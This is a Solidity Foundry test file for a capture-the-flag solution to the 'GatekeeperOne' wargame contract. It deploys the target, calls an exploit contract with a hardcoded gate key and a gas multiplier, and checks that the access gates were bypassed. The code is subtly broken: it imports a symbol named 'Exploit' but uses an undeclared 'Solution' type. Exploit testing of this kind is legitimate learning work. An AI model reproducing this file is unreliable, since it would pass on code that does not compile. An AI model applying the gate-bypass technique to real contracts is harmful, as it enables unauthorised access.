// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {GatekeeperOne} from "../src/GatekeeperOne.sol";
import {Exploit} from "../src/GatekeeperOneExploit.sol";

address constant DEPLOYER = 0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38;
bytes8 constant GATEKEY = 0x0023caca00001f38;

contract SolutionTest is Test {
    GatekeeperOne gk;
    Solution sol;

    function setUp() public {
        gk = new GatekeeperOne();
        sol = new Solution(address(gk));
    }

    function testSolution() public {
        uint multiplier = 3;
        uint ans = sol.makeEntrant(GATEKEY, multiplier);
        console.log("Total forwarded gas to GatekeeperOne.entrant(): %s", ans);
        console.log("Total consumed gas until gasleft(): %s", ans-multiplier*8191);

        address entrant = gk.entrant();
        assertEq(entrant, DEPLOYER, "Not entrant.");
    }
}
